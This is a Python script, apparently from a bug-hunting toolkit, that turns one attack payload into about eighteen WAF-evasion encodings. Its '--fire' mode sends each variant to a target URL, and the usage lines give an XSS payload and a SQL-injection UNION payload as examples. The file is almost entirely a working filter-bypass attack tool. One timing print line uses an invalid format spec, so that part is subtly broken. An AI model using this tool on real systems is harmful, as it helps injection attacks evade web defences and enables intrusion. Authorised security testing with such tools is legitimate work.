#!/usr/bin/env python3
"""waf_encoder.py — WAF payload encoding matrix (upstream port).

Generates encoding variants of ONE payload so the response-analyzer can tell
exactly which transformation layer the inspection blind spot lives at.
Pure transformations (offline) + optional --fire mode against the target.

From awarexone/Agentic-Bug-Hunter's waf_encoder.py, slim + stdlib-only.
Safety: fire mode is an evidence probe (single request per variant, delay 0.3s).

Usage:
  python scripts/waf_encoder.py "<script>alert(1)</script>"
  python scripts/waf_encoder.py "' UNION SELECT 1,2,3--" --fire https://t/x?q=
"""
from __future__ import annotations

import argparse
import json
import time
import urllib.parse
import urllib.request


def variants(p: str) -> dict[str, str]:
    tr = {
        "plain":           p,
        "url":             urllib.parse.quote(p, safe=""),
        "url_2x":          urllib.parse.quote(urllib.parse.quote(p, safe=""), safe=""),
        "url_nobin":       urllib.parse.quote(p, safe="/%"),
        "url_broken":      p.replace("&", "%25&"),
        "unicode_esc":     "".join(c if c.isalnum() else "\\u%04x" % ord(c) if ord(c) < 0x100 else c for c in p),
        "nbsp":            p.replace(" ", "\u00a0"),
        "crlf_h":          p.replace("<", "%0d%0a<", 1) if "<" in p else p,
        "case_shuffle":    "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p)),
        "case_alt":        p.upper() if p.islower() else p.lower(),
        "comment_split":   p[:2] + "/*x*/" + p[2:] if len(p) > 4 else p,
        "newline_mid":     p[:len(p) // 2] + "%0a" + p[len(p) // 2:],
        "tab_mid":         p[:len(p) // 2] + "%09" + p[len(p) // 2:],
        "plus_space":      p.replace(" ", "+"),
        "dot_fusion":      "/" + p.replace("/", "//"),
        "backslash_fuse":  p.replace("/", "\\"),
        "b64":             __import__("base64").b64encode(p.encode()).decode(),
        "hex":             "".join(f"%{ord(c):02x}" for c in p),
    }
    return tr


def _fire(url_prefix: str, vs: dict[str, str], delay: float) -> None:
    for name, v in vs.items():
        url = url_prefix + urllib.parse.quote(v, safe="")
        t0 = time.time()
        try:
            with urllib.request.urlopen(url, timeout=10) as r:
                print(f"  {name:<14} {r.status} len={len(r.read())} {round((time.time()-t0)*1000):ms}".replace("ms", "ms"))
        except urllib.error.HTTPError as e:
            print(f"  {name:<14} {e.code} len={len(e.read())}")
        except Exception as e:
            print(f"  {name:<14} ERR {e}")
        time.sleep(delay)


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("payload")
    p.add_argument("--fire", default=None, metavar="URL_PREFIX",
                   help="evidence-probe mode: fire each variant at URL_PREFIX")
    p.add_argument("--delay", type=float, default=0.3)
    a = p.parse_args()
    vs = variants(a.payload)
    if not a.fire:
        print(json.dumps(vs, indent=2))
    else:
        _fire(a.fire, vs, a.delay)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
